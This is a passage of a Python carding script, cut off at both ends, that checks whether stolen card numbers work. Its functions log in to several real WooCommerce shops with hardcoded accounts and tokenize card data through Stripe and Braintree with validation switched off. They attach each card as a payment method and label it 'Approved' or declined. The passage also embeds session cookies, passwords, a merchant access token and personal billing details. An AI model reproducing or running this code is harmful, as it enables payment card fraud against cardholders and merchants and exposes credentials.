QmXiTmhfuywUSlVuUSeJ1PMSheHRgBsiIcTC_foEySRngbtsIeW7PLc5vMhdK2wiy9YXKDk5VpfyCpNiaKSeLjVAavir2A1JJHhFrGDxQOSbxjhBbr3vIkRqGRQRjV7jpln4_FJMiuOQS2QldNCjccju2dnctBAlR504aoiDotRvZX1BytkR-MnnN8Lyb7UUY9pW7ggeHFbY6dnFLZihMiXtkiLFy6Uelu1uA97-dcYcp1RxsHbqvHSTqnZ4Q0_56X_Deamp1e1mPLLWEbeUkMUr0p0709DwhkbLsOf-Rqst0jBOwq9k023Nl8a1FNk0qmD3cI96HvkWR4ABzZdlHbUzUzcuWoYteNpwCC7oMJKm8prfOhRNSsceUsX9pTaH-L-iabGxBDf1LMTNNQ53my4LbcWb3iaAzdTGSbiQuHD1c-2foruTTjHJl-IF2WDB5LLVtb6vlaZEzizLFEa_zEItJ9MfbkvkSlzBJg2sBvY0Ep-y320RAGnqWRr4kXUo38_8SVnEy82fvPeLyxVpntMYBRCObjclCW8FuM1VUxdOo8vOjHwrXW2-06d6jRC0PPnhuaKu6NleHDOZomhiahzaGFyZF9pZM4DMYNvomtyqDM3MTBiOTMwonBkAA.NQZGgVloX6HR6ZyFUT0Wzt073vYVzdzQjNYKeS6Zi_Q'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	idd = (response.json()['id'])
	
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-07-06%2019%3A36%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fdelspets.com%2Fbasket%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdelspets.com%2Fcheckout%2F%3F__cf_chl_tk%3DD.2gbzE1DE8RaM0_jpiwUtKHRVZo0W8_qkuoufwxejc-1720294560-0.0.1.1-3689',
	    'sbjs_first_add': 'fd%3D2024-07-06%2019%3A36%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fdelspets.com%2Fbasket%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdelspets.com%2Fcheckout%2F%3F__cf_chl_tk%3DD.2gbzE1DE8RaM0_jpiwUtKHRVZo0W8_qkuoufwxejc-1720294560-0.0.1.1-3689',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36',
	    'woosw_key': '4U05C6',
	    'tk_ai': 'lAa2fSJekILJ71NcOX6AXTpj',
	    'cf_clearance': 'fi5U8qSyPb7Lj6Fn.QvwSLLZA4QdVdRdohSChtO9ieQ-1720294577-1.0.1.1-5hBSfAgXBYdilTqWA9ZJ5No1mfNTuG9AKvPbQncodRajDjmIXahg.11S3uQtRKNOEVzn9ADaTYMcCLoxunnfrg',
	    '_gcl_au': '1.1.65270818.1720294579',
	    '_gid': 'GA1.2.550245854.1720294579',
	    '__stripe_mid': 'c99397cf-583a-4115-a9c6-682e05510842e3b4bc',
	    '__stripe_sid': 'ea7cccb0-9998-4c18-bb4d-791e7badfcbc96a37e',
	    'woocommerce_items_in_cart': '1',
	    'cookieyes-consent': 'consentid:Q2MzVE10WXVWQmUyZ0kwb09jRWx6V1dCUXRyNFFaM1g,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no',
	    'woocommerce_cart_hash': 'f0f0dd1756c35ad6fb737e72cb88d054',
	    '_lscache_vary': '673df56ff202194dde17f5f3740da397',
	    'wordpress_logged_in_588bce2a8a54b87a4ab6f937e255bed8': 'gggg.vvvv%7C1721505278%7CYhudroF9EflgpbbPKgFKPnmoQAUp6an2RJ0KMCBxGSl%7Cb97a49321f7131c944c62bef74925e6301110b65a1020571eb06165bd4fac91d',
	    'tk_ai': 'jetpack%3A%2B7LX72QSRvUhkQvWSooJQXq0',
	    'wp_woocommerce_session_588bce2a8a54b87a4ab6f937e255bed8': '1273%7C%7C1720467434%7C%7C1720463834%7C%7C252d946954a221b32e5d0c38e24f8b40',
	    '_ga_MQGMQ10X14': 'GS1.1.1720294575.1.1.1720295685.0.0.0',
	    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdelspets.com%2Fcheckout%2F',
	    '_ga': 'GA1.1.2056652936.1720294575',
	    '_ga_QBG7829BYG': 'GS1.1.1720294579.1.1.1720295688.0.0.0',
	    'tk_qs': '',
	    '__kla_id': 'eyJlbWFpbCI6Imd2dnZ2NzI3N0BnbWFpbC5jb20ifQ==',
	}
	
	headers = {
	    'authority': 'delspets.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-06%2019%3A36%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fdelspets.com%2Fbasket%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdelspets.com%2Fcheckout%2F%3F__cf_chl_tk%3DD.2gbzE1DE8RaM0_jpiwUtKHRVZo0W8_qkuoufwxejc-1720294560-0.0.1.1-3689; sbjs_first_add=fd%3D2024-07-06%2019%3A36%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fdelspets.com%2Fbasket%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdelspets.com%2Fcheckout%2F%3F__cf_chl_tk%3DD.2gbzE1DE8RaM0_jpiwUtKHRVZo0W8_qkuoufwxejc-1720294560-0.0.1.1-3689; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36; woosw_key=4U05C6; tk_ai=lAa2fSJekILJ71NcOX6AXTpj; cf_clearance=fi5U8qSyPb7Lj6Fn.QvwSLLZA4QdVdRdohSChtO9ieQ-1720294577-1.0.1.1-5hBSfAgXBYdilTqWA9ZJ5No1mfNTuG9AKvPbQncodRajDjmIXahg.11S3uQtRKNOEVzn9ADaTYMcCLoxunnfrg; _gcl_au=1.1.65270818.1720294579; _gid=GA1.2.550245854.1720294579; __stripe_mid=c99397cf-583a-4115-a9c6-682e05510842e3b4bc; __stripe_sid=ea7cccb0-9998-4c18-bb4d-791e7badfcbc96a37e; woocommerce_items_in_cart=1; cookieyes-consent=consentid:Q2MzVE10WXVWQmUyZ0kwb09jRWx6V1dCUXRyNFFaM1g,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no; woocommerce_cart_hash=f0f0dd1756c35ad6fb737e72cb88d054; _lscache_vary=673df56ff202194dde17f5f3740da397; wordpress_logged_in_588bce2a8a54b87a4ab6f937e255bed8=gggg.vvvv%7C1721505278%7CYhudroF9EflgpbbPKgFKPnmoQAUp6an2RJ0KMCBxGSl%7Cb97a49321f7131c944c62bef74925e6301110b65a1020571eb06165bd4fac91d; tk_ai=jetpack%3A%2B7LX72QSRvUhkQvWSooJQXq0; wp_woocommerce_session_588bce2a8a54b87a4ab6f937e255bed8=1273%7C%7C1720467434%7C%7C1720463834%7C%7C252d946954a221b32e5d0c38e24f8b40; _ga_MQGMQ10X14=GS1.1.1720294575.1.1.1720295685.0.0.0; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdelspets.com%2Fcheckout%2F; _ga=GA1.1.2056652936.1720294575; _ga_QBG7829BYG=GS1.1.1720294579.1.1.1720295688.0.0.0; tk_qs=; __kla_id=eyJlbWFpbCI6Imd2dnZ2NzI3N0BnbWFpbC5jb20ifQ==',
	    'origin': 'https://delspets.com',
	    'referer': 'https://delspets.com/checkout/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-arch': '"x86"',
	    'sec-ch-ua-bitness': '"64"',
	    'sec-ch-ua-full-version': '"120.0.6099.116"',
	    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-model': '""',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-ch-ua-platform-version': '""',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'checkout',
	}
	
	data = 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fdelspets.com%2Fcheckout%2F%3F__cf_chl_tk%3DD.2gbzE1DE8RaM0_jpiwUtKHRVZo0W8_qkuoufwxejc-1720294560-0.0.1.1-3689&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fdelspets.com%2Fbasket%2F&wc_order_attribution_session_start_time=2024-07-06+19%3A36%3A12&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(X11%3B+Linux+x86_64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F120.0.0.0+Safari%2F537.36&billing_first_name=Gggg&billing_last_name=Vvvv&billing_company=&billing_country=GB&billing_address_1=49+Featherstone+Street&billing_address_2=&billing_city=London&billing_state=&billing_postcode=EC1Y+8SY&billing_phone=447947570472&billing_email=gvvvv7277%40gmail.com&shipping_first_name=Gggg&shipping_last_name=Vvvv&shipping_company=&shipping_country=GB&shipping_address_1=49+Featherstone+Street&shipping_address_2=&shipping_city=London&shipping_state=&shipping_postcode=EC1Y+8SY&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=stripe&woocommerce-process-checkout-nonce=ee0ba6b686&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='+str(idd)+''
	
	response = requests.post('https://delspets.com/', params=params, cookies=cookies, headers=headers, data=data)
	
	text = response.text
	print(text)

	if 'The card was declined.' in text:
	   result = 'The card was declined.'
	   return result

	elif 'Sorry, we are unable to process your payment at this time. Please retry later.' in text:
		result = 'risk visa'
		return result
		
	else:
	   return text
    	
            
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://romanticdepot.com/store/my-account/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	log = se.get('https://romanticdepot.com/store/my-account/',  headers=headers).text
	
	
	nonce = BeautifulSoup(log, 'html.parser').find('input', {'name':'woocommerce-login-nonce'})['value']
	
	
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://romanticdepot.com',
	    'referer': 'https://romanticdepot.com/store/my-account/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'username': 'rh.io.n.a.abu.end.o@gmail.com',
	    'password': 'Año2024@@S',
	    'woocommerce-login-nonce': nonce,
	    '_wp_http_referer': '/store/my-account/',
	    'login': 'Log in',
	}
	
	access = se.post('https://romanticdepot.com/store/my-account/', headers=headers, data=data)
	
	
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://romanticdepot.com/store/my-account/payment-methods/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	add_get = se.get('https://romanticdepot.com/store/my-account/add-payment-method/', headers=headers).text
	
	nonce2 = BeautifulSoup(add_get, 'html.parser').find('input', {'name':'woocommerce-add-payment-method-nonce'})['value']
	
	bearer = (add_get.split('var wc_braintree_client_token = ["')[1]).split('"];')[0]
	bearer = json.loads(base64.b64decode(bearer))
	bearer2 = bearer['authorizationFingerprint']
	
	
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'es-CO,es-419;q=0.9,es;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {bearer2}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e7577ba9-9ec5-46c6-87b8-2661e26a8640',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '11375',
	                    'streetAddress': '3 Ridgewood Ave. Forest Hills, NY 11375',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	token = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()['data']['tokenizeCreditCard']['token']
	
	
	
	
	headers = {
	    'authority': 'romanticdepot.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://romanticdepot.com',
	    'referer': 'https://romanticdepot.com/store/my-account/add-payment-method/',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': token,
	    'braintree_cc_device_data': '{"device_session_id":"7b6020524de3e7e620c529b9cabc80dc","fraud_merchant_id":null,"correlation_id":"08c5cb432529259f770b75ff84ec5fb0"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/yykkn3gsjbd9gwms/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/yykkn3gsjbd9gwms"},"merchantId":"yykkn3gsjbd9gwms","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"yykkn3gsjbd9gwms","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"RDepot LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjEyMDA0NjAsImp0aSI6ImY2YmEzOTU1LWQ1NTItNDIwMC04ZWM0LThiYjI0M2UwYTEyYiIsInN1YiI6Inl5a2tuM2dzamJkOWd3bXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inl5a2tuM2dzamJkOWd3bXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.Llnn3XIBleeQP2pNfuPaq_7ooAWTxQBxGgf7RBhd4V8rEDJ0iZEIOsbOOgp-MW9nCRS-sLYTZ-1tiht-qvgqqg","paypalClientId":"AfwIL-cFTwlaBeUa_93XHy1sF5jkDSaG76UZVgWKBbA7aPK9GVJ8sWJjEnpO6TnLD_J3jHD8lgL65nDp","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3409271549654466861","accessToken":"access_token$production$yykkn3gsjbd9gwms$3bb95f9b76126eda6a7d648b2c52e74b","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"RDepot LLC","clientId":"AfwIL-cFTwlaBeUa_93XHy1sF5jkDSaG76UZVgWKBbA7aPK9GVJ8sWJjEnpO6TnLD_J3jHD8lgL65nDp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"rdepotllc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': nonce2,
	    '_wp_http_referer': '/store/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	respo = se.post(
	    'https://romanticdepot.com/store/my-account/add-payment-method/',
	    headers=headers,
	    data=data,
	)
	
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result




def bo(ccx):
	import requests,user_agent,re,base64,json,random
	from bs4 import BeautifulSoup
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	user = user_agent.generate_user_agent()
	varps=['visaspam77@gmail.com','visaspam777@gmail.com']
	def up(varp):
		r = requests.session()
		headers = {'user-agent': user}
		response = r.post('https://firefly-fields.com/my-account/add-payment-method/',headers=headers)
		nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
		data = {
		    'username': varp,
		    'password': 'my-account',
		    'woocommerce-login-nonce': nonce,
		    '_wp_http_referer': '/my-account/add-payment-method/',
		    'login': 'Log in'}
		response = r.post('https://firefly-fields.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
		nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
		JWT_nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]		
		headers = {
		    'authority': 'firefly-fields.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    # 'cookie': 'wordpress_sec_8ac74b3414a98b6ff4fd6f539248fc0a=mska.wj-6980%7C1715377832%7CbsE5QH33aNn1A6F2pUR9x9V1yIYHh9pPvQweG60p5bw%7C36631a51eb901700570f90b53b56ac577bb211eee424d051533f9617cbca0f04; tk_or=%22https%3A%2F%2Fwww.bing.com%2F%22; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; tk_ai=lVnMcJOg2N0GnWKChpDqwINk; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __utmz=142726050.1713365611.2.2.utmcsr=bing|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); tk_lr=%22%22; __utma=142726050.181325669.1713184979.1714549400.1715205020.5; __utmc=142726050; __utmt=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-08%2021%3A50%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-05-08%2021%3A50%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36; _gid=GA1.2.1617601179.1715205022; wordpress_logged_in_8ac74b3414a98b6ff4fd6f539248fc0a=mska.wj-6980%7C1715377832%7CbsE5QH33aNn1A6F2pUR9x9V1yIYHh9pPvQweG60p5bw%7C6c29a9873a1d87543248b4fb1aef775bd0cf449e45522f7427b9d9dd4ae59119; tk_qs=; _gat_gtag_UA_128958617_1=1; __utmb=142726050.4.10.1715205020; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F; _ga_51HCC8HHHV=GS1.1.1715205021.5.1.1715205319.0.0.0; _ga=GA1.1.1448327166.1713184980',
		    'origin': 'https://firefly-fields.com',
		    'referer': 'https://firefly-fields.com/my-account/add-payment-method/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': JWT_nonce,
		}
		response = requests.post('https://firefly-fields.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					 varp : {
		  "nonce": nonce,
		  "au": au
					}
				
		}
		try:
			existing_data['Auth'].update(new_data)
		except:
			new_data = {"Auth": {
			 varp : {
		  "nonce": nonce,
		  "au": au
					}
				}
			}
			existing_data.update(new_data)
		import pickle
		import http.cookiejar
		with open(F'Auth_{varp}.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	with open('filechk.txt', 'r') as file:
		last_acc = file.readline()
	while True:
		varp = random.choice(varps)
		if last_acc==varp:
			pass
		else:
			break
	try:
		nonce=json_data['Auth'][varp]['nonce']
		au=json_data['Auth'][varp]['au']
		import pickle
		import http.cookiejar
		with open(f'Auth_{varp}.pkl', 'rb') as f:
			c = pickle.load(f)
		r = requests.session()
		r.cookies=c
	except Exception as e:
		for varp in varps:
			up(varp)
		print(e)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e1636f23-9ffd-4a20-b820-03fa00946fa5',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for varp in varps:
			up(varp)
	headers = {
    'authority': 'firefly-fields.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
